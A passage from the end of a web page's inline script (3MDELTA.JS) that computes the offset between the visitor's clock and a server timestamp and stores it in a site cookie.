      delta -= 1558982894;
      if ( delta > -60 && delta < 60 ) delta = 0;
      rbcSetCookie( "3mDELTA", delta + "/" + dtype, cdate.toGMTString(), "/" );
    }
  }
  else rbcSetCookie( "3mDELTA", "0/" + dtype, cdate.toGMTString(), "/" );

  if ( rbcGetCookie( "3mDELTA", null ) == null )
  {
  }
}
// 3MDELTA.JS
        </script>
    </body>
</html>
